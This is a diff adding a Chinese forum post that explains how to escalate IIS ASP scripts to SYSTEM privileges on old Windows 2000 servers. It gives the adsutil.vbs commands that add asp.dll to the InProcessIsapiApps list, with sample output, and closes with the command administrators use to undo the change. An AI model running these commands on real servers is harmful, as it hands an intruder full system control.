@@ -1,0 +1,45 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+asp.dll解析成system提升权限
+D8888D主贴内容-------------------------------------------------------
+asp.dll解析成system提升权限 
+网络上传统的提升asp权限为系统的有两种: 
+1.图形化下的,把默认站点---->主目录--->应用程序保护设置为低,这样就可以把asp权限设置为system. 
+但这种提升方法很容易被发现,所以网络有另一种一般是用adsutil.vbs来提升权限.而这个也是今天 
+我要谈的关于adsutil.vbs提升权限. 
+2.用adsutil.vbs搞定. 
+在网络上我看到了很多的教你用这种方法的动画,文章,但我至今没有看到一篇介绍原理的,下面我谈谈我个人的看法: 
+先举个例子: 
+有一群狗,这群狗里有几个长老级狗物,它们拥有着至高无上的权限,而其它的狗,他们的权限则少得可怜. 
+转到计算机上: 
+在IIS中,有几个Dll文件是拥有特权限的,我们可以理解为系统权限,就像长老级的狗.而解析asp的asp.dll则就像一只 
+普通的狗,他的权限少得可怜. 
+那么,如果asp.dll也成了长老级的狗的话,那么asp不也就有了系统权限了吗,这是可以成立的.所以我们的思路也就是 
+把asp.dll加入特权的dll一族之中.提升步骤为: 
+<1>先查看有特权一话有哪些. 
+<2>加asp.dll加入特权一族 
+好了,下面我们就来实践这个过程. 
+1)查看有特权的dll文件: 
+命令为:cscript adsutil.vbs get /W3SVC/InProcessIsapiApps 
+得到显示为: 
+C:\\Inetpub\\AdminScripts>cscript adsutil.vbs get /W3SVC/InProcessIsapiApps 
+Microsoft (R) Windows 脚本宿主版本 5.1 for Windows 
+版权所有(C) Microsoft Corporation 1996-1999. All rights reserved. 
+InProcessIsapiApps : (LIST) (5 Items) 
+"C:\\WINNT\\system32\\idq.dll" 
+"C:\\WINNT\\system32\\inetsrv\\httpext.dll" 
+"C:\\WINNT\\system32\\inetsrv\\httpodbc.dll" 
+"C:\\WINNT\\system32\\inetsrv\\ssinc.dll" 
+"C:\\WINNT\\system32\\msw3prt.dll" 
+看到没有,他说明的是有特权限一族为:idq.dll httpext.dll httpodbc.dll ssinc.dll msw3prt.dll 
+这几个文件,不同的机子,可能会不同. 
+2)把asp.dll加入特权一族: 
+因为asp.dll是放在c:\\winnt\\system32\\inetsrv\\asp.dll (不同的机子放的位置不一定相同) 
+我们现在加进去cscript adsutil.vbs set /W3SVC/InProcessIsapiApps "C:\\WINNT\\system32\\idq.dll" "C:\\WINNT\\system32\\inetsrv\\httpext.dll" "C:\\WINNT\\system32\\inetsrv\\httpodbc.dll" "C:\\WINNT\\system32\\inetsrv\\ssinc.dll" "C:\\WINNT\\system32\\msw3prt.dll""c:\\winnt\\system32\\inetsrv\\asp.dll" 
+好了,现在你可以用cscript adsutil.vbs get /W3SVC/InProcessIsapiApps 来查看是不是加进去 
+了,注意,用法中的get和set,一个是查看一个是设置.还有就是你运行上面的你要到C:\\Inetpub\\AdminScripts>这个目录下. 
+那么如果你是一个管理员,你的机子被人用这招把asp提升为system权限,那么,这时,防的方法就是把asp.dll T出特权一族,也就是用set这个命令,覆盖掉刚才的那些东东. 
+例:cscript adsutil.vbs set /W3SVC/InProcessIsapiApps "C:\\WINNT\\system32\\idq.dll" "C:\\WINNT\\system32\\inetsrv\\httpext.dll" "C:\\WINNT\\system32\\inetsrv\\httpodbc.dll" "C:\\WINNT\\system32\\inetsrv\\ssinc.dll" "C:\\WINNT\\system32\\msw3prt.dll" 
+这样就可以了,当你再用cscript adsutil.vbs get /W3SVC/InProcessIsapiApps 这个语句查之时,如果没有看见asp.dll, 
+说明,asp的权限又恢复到以前的权限.
